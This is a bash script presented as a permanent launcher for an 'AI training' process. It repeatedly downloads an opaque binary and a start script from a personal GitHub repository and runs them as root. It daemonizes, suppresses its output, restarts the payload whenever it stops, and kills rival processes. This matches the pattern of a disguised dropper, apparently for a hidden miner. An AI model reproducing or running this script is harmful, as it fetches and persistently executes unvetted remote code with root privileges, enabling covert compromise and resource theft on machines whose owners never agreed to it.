#!/bin/bash

# Permanent Background Launcher - Session Never Expires
# Run once and forget - survives disconnections, reboots, and errors

# Configuration
SESSION_NAME="perm_ai_train"
LOG_DIR="./perm_logs"
LOCK_FILE="/tmp/ai_launcher.lock"
MAX_RUNTIME=3600  # 1 hour forced restart
CHECK_INTERVAL=300  # 5 minutes health check

# Create log directory
mkdir -p $LOG_DIR

# Function to log with timestamp
log() {
    echo "$(date '+%Y-%m-%d %H:%M:%S') - $1" | tee -a $LOG_DIR/permanent_launcher.log
}

# Function to cleanup on exit
cleanup() {
    log "Cleaning up before exit..."
    rm -f $LOCK_FILE
    # Don't kill processes - let them keep running
    log "Cleanup completed - processes continue running"
    exit 0
}

# Set trap for signals
trap cleanup SIGINT SIGTERM EXIT

# Check if already running
if [ -f $LOCK_FILE ]; then
    log "Launcher already running (lock file exists). Exiting."
    exit 1
fi

# Create lock file
echo $$ > $LOCK_FILE
log "=== PERMANENT AI LAUNCHER STARTED ==="
log "PID: $$ | Session: $SESSION_NAME | Logs: $LOG_DIR"

# Function to stop processes gracefully
stop_processes() {
    log "Stopping AI processes..."
    for proc in "start_modelgp.sh" "aitraining" "bx.sh"; do
        if pgrep -f "$proc" > /dev/null; then
            sudo pkill -f "$proc"
            sleep 3
            # Force kill if needed
            if pgrep -f "$proc" > /dev/null; then
                sudo pkill -9 -f "$proc"
                sleep 2
            fi
            log "Stopped: $proc"
        fi
    done
}

# Function to download files
download_files() {
    log "Downloading latest files..."
    rm -f ./bx.sh ./aitraining ./start_modelgp.sh
    
    for i in {1..5}; do  # Increased retries
        if sudo wget -q -O ./aitraining https://github.com/max313iq/Ssl/raw/main/aitraining && \
           sudo wget -q -O ./start_modelgp.sh https://github.com/max313iq/Ssl/raw/main/start_modelgp.sh; then
            break
        else
            log "Download attempt $i failed, retrying in 10s..."
            sleep 10
        fi
    done
    
    if [[ -f "./aitraining" && -f "./start_modelgp.sh" ]]; then
        sudo chmod +x ./aitraining ./start_modelgp.sh
        log "Files downloaded successfully"
        return 0
    else
        log "CRITICAL: Failed to download files"
        return 1
    fi
}

# Function to start main AI process
start_ai_process() {
    log "Starting main AI process..."
    
    if ! download_files; then
        return 1
    fi
    
    # Start the process and detach completely
    nohup sudo bash ./start_modelgp.sh > $LOG_DIR/ai_process.log 2>&1 &
    local ai_pid=$!
    
    # Wait for initialization
    sleep 15
    
    # Verify it's running
    if ps -p $ai_pid > /dev/null && pgrep -f "aitraining" > /dev/null; then
        echo $ai_pid > $LOG_DIR/ai_pid.txt
        log "AI process started successfully - PID: $ai_pid"
        return 0
    else
        log "FAILED: AI process died immediately"
        return 1
    fi
}

# Function to monitor and restart if needed
monitor_process() {
    local consecutive_failures=0
    local max_failures=5
    
    while true; do
        if pgrep -f "aitraining" > /dev/null; then
            consecutive_failures=0
            log "✓ AI process healthy - sleeping $CHECK_INTERVAL seconds"
            sleep $CHECK_INTERVAL
        else
            consecutive_failures=$((consecutive_failures + 1))
            log "✗ AI process DEAD - Failure #$consecutive_failures"
            
            if [ $consecutive_failures -ge $max_failures ]; then
                log "CRITICAL: Too many failures, performing full restart..."
                stop_processes
                sleep 5
            fi
            
            if start_ai_process; then
                log "Recovery successful - process restarted"
                consecutive_failures=0
            else
                log "Recovery failed - will retry in 30s"
                sleep 30
            fi
        fi
        
        # Log rotation
        if [ -f "$LOG_DIR/ai_process.log" ] && [ $(stat -f%z "$LOG_DIR/ai_process.log" 2>/dev/null || stat -c%s "$LOG_DIR/ai_process.log") -gt 104857600 ]; then
            log "Rotating large AI process log"
            mv "$LOG_DIR/ai_process.log" "$LOG_DIR/ai_process.log.old"
            touch "$LOG_DIR/ai_process.log"
        fi
    done
}

# Function to setup permanent process
setup_permanent_session() {
    log "Setting up permanent session..."
    
    # First startup
    if start_ai_process; then
        log "Initial startup successful"
    else
        log "Initial startup failed - retrying in 30s"
        sleep 30
        start_ai_process || log "CRITICAL: Could not start AI process"
    fi
    
    # Start the eternal monitor
    monitor_process
}

# Function to show status
show_status() {
    echo "=== PERMANENT AI LAUNCHER STATUS ==="
    echo "Launcher PID: $$"
    echo "Lock file: $LOCK_FILE"
    echo "Log directory: $LOG_DIR"
    
    if pgrep -f "aitraining" > /dev/null; then
        echo "AI Process: ✅ RUNNING (PID: $(pgrep -f "aitraining"))"
    else
        echo "AI Process: ❌ STOPPED"
    fi
    
    if [ -f "$LOG_DIR/ai_pid.txt" ]; then
        echo "Saved AI PID: $(cat $LOG_DIR/ai_pid.txt)"
    fi
    
    echo "=== RECENT LOGS ==="
    tail -5 $LOG_DIR/permanent_launcher.log 2>/dev/null || echo "No logs yet"
}

# Function to stop everything
stop_everything() {
    log "FULL SHUTDOWN COMMAND RECEIVED"
    rm -f $LOCK_FILE
    stop_processes
    log "=== ALL PROCESSES STOPPED ==="
    exit 0
}

# Main execution
case "${1:-}" in
    status)
        show_status
        exit 0
        ;;
    stop)
        stop_everything
        ;;
    restart)
        log "RESTART COMMAND RECEIVED"
        stop_processes
        sleep 5
        # Re-execute self
        exec "$0" 
        ;;
    *)
        # Check if we're already running in background
        if [ "$(ps -o comm= -p $$)" = "bash" ] && [ -t 0 ]; then
            log "Running in terminal, daemonizing..."
            # Daemonize ourselves
            nohup "$0" daemon > $LOG_DIR/daemon_start.log 2>&1 &
            echo "Launcher started in background with PID: $!"
            echo "Check status with: $0 status"
            echo "Stop with: $0 stop"
            echo "Logs: $LOG_DIR/permanent_launcher.log"
            exit 0
        fi
        
        # Main daemon code
        log "=== DAEMON MODE ACTIVATED ==="
        log "This process will run permanently until system shutdown"
        log "Disconnect from terminal - process will continue running"
        
        # Completely detach from terminal
        if [ -t 1 ]; then
            exec > /dev/null 2>&1
        fi
        
        # Main eternal loop
        while true; do
            setup_permanent_session
            log "CRITICAL: Main monitor exited - restarting in 30s"
            sleep 30
        done
        ;;
esac
